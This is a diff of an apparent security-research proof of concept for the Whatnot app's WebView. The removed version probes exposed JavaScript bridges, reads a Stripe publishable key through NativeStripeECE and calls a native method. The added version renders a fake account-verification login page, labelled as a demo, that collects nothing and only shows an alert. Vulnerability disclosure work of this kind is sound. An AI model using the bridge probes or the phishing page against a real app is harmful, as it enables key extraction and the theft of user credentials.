@@ -1,41 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Whatnot Exploit PoC</title>
+  <title>Whatnot Security Test</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial;
+      background: #fff;
+      padding: 20px;
+    }
+    .box {
+      max-width: 400px;
+      margin: auto;
+    }
+    h2 {
+      color: #000;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: black;
+      color: white;
+      border: none;
+    }
+    .warning {
+      color: red;
+      font-size: 12px;
+    }
+  </style>
 </head>
 <body>
-  <h1>WebView Exploit PoC</h1>
 
-  <script>
-    function log(msg) {
-      document.body.innerHTML += "<p>" + msg + "</p>";
-    }
+<div class="box">
+  <h2>Whatnot Account Verification</h2>
+  <p>Please verify your account to continue.</p>
 
-    log("Page loaded");
+  <input placeholder="Email or Username">
+  <input placeholder="Password" type="password">
 
-    // Check bridge existence
-    log("androidBridge: " + typeof window.androidBridge);
-    log("NativeStripeECE: " + typeof window.NativeStripeECE);
+  <button onclick="demo()">Verify</button>
 
-    // Try extracting Stripe key
-    try {
-      if (window.NativeStripeECE) {
-        let key = window.NativeStripeECE.getStripePublishableKey();
-        log("Stripe Key: " + key);
-      }
-    } catch (e) {
-      log("Stripe error: " + e.message);
-    }
+  <p class="warning">
+    ⚠️ This is a security research demo. No data is collected.
+  </p>
+</div>
 
-    // Try calling native method
-    try {
-      if (window.NativeStripeECE) {
-        window.NativeStripeECE.handleClick({ test: "poc" });
-        log("handleClick executed");
-      }
-    } catch (e) {
-      log("handleClick error: " + e.message);
-    }
-  </script>
+<script>
+function demo() {
+  alert("This demonstrates that a fake login page can be shown inside the app.");
+}
+</script>
+
 </body>
 </html>
